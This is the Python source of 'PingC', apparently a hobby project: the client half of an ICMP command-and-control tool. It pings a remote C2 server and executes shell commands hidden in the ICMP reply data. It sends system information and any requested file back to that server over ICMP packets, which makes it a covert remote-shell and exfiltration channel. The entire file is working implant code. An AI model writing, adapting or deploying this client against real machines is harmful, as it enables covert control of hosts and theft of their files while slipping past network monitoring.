#! /usr/bin/env python

# PingC ICMP command and control client application
# by NoCow
# This is the client side application for my ICMP C2 project. The client will periodically ping the C2 server
#  and receive commands in the data portion of the reply. I am currently using Scapy for the packet building
# Usage: ./pingc.py <IP>

import sys
import time
import signal
import subprocess as sub
from scapy.all import *


def getId():
	#print "[D] Getting bot Id"
	conf_file = open('pingc.conf','r')
	id='null'
	for line in conf_file:
		if 'id=' in line:
			id=line[3:]
	#print "[D] Return id: " + id
	return id	

def retrieveId(botId):
	#print "[D] Writing bot Id: ",botId
	conf_file = open('pingc.conf','w')
	idstr="id="+str(botId)
	conf_file.write(idstr)
	conf_file.close()

def handler(signum, frame):
        print 'Bye!'
        sys.exit()

def sendFile(filename,botId):
	print "[*] Sending file: %s" % filename
	file = open(filename, 'r')
	startLine = '(FILE_START) ' + str(filename)
	packet=IP(dst=sys.argv[1])/ICMP(id=int(botId))/startLine
	p=sr1(packet,timeout=1)
	for line in file:
		#print "[D] Sending line: %s" % line
		sendLine = '(FILE) ' + filename + ' ' + line
		packet=IP(dst=sys.argv[1])/ICMP(id=int(botId))/sendLine
		#send(packet)
		#time.sleep(1)
		p=sr1(packet,timeout=1)
	print "[D] End of file"
	finishLine = '(FILE_END) ' + str(filename)
	packet=IP(dst=sys.argv[1])/ICMP(id=int(botId))/finishLine
	send(packet)

	
def sendPingRequest(command,botId):
	if botId == 123456789:
		# Initial Checkin request
		packet=IP(dst=sys.argv[1])/ICMP()/str(command)
	else:
		packet=IP(dst=sys.argv[1])/ICMP(id=int(botId))/str(command)
        packet.show()
        print "[*] Request sent to C2 server: " + command
	p=sr1(packet,timeout=10)
        p.show()
	if p:
		return p
	else:
		return

def processReply(p):
	try:
		response=p['Raw'].load
        except:
		print "[X] Error: ", sys.exc_info()[0]
		return
	# Check ICMP data for 'run' command
        print "[*] String received from C2 server: " + p['Raw'].load
        if 'run' in response:
        	print "[*] Master says run command: " + response[4:]
                command = response[4:]
                command.split()
                proc = sub.Popen(command,stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                output, errors = proc.communicate()
		print output
                print errors
	elif 'sysinfo' in response:
        	print "[*] Master requesting sysinfo"
		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                output, errors = proc.communicate()
                botId=getId()
		sendRequest = 'sysinfo %s' % output
		p=sendPingRequest(sendRequest, botId)
		if p:	
			processReply(p)
		#print output
                print errors
	elif 'Thanks' in response:
		print "[*] Thanks received"
		print "[*] Sleeping for 10"
		time.sleep(10)
        elif 'get' in response:
		print "[*] Master says give him %s" % response[4:]
		botId=getId()
		sendFile(response[4:], botId) 
	elif 'sleep' in response:
		seconds = response[6:]
                print "[*] Master says sleep for %s seconds" % (seconds)
                print "[*] Sleeping..."
                time.sleep(int(seconds))
		botId=getId()
		sendStr="What shall I do master?"
                p=sendPingRequest(sendStr, botId)
                processReply(p)
	elif 'id=' in response:
		print "[*] Checked in...placing id in conf file"
		retrieveId(response[3:])

def main(argv):
	id = getId()
	if id=='null':
		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                output, errors = proc.communicate()
                p=sendPingRequest('Checkin %s' % output,123456789)
                if p:
                        processReply(p)
                #print output
                print errors
		if p:
			processReply(p)
		#print "[D] id==null"
	while True:
		if len(argv) < 1:
			print "----------------------------"
			print "PingC Usage"
			print " ./pingc.py <IP>"
			print "----------------------------"
			exit()
		signal.signal(signal.SIGINT, handler)
		id = getId()
		sendStr="What shall I do master?"
		p=sendPingRequest(sendStr, id)
		if p:
			processReply(p)
		print "[*] Sleeping now..."
		time.sleep(300)

if __name__ == "__main__":
   main(sys.argv[1:])

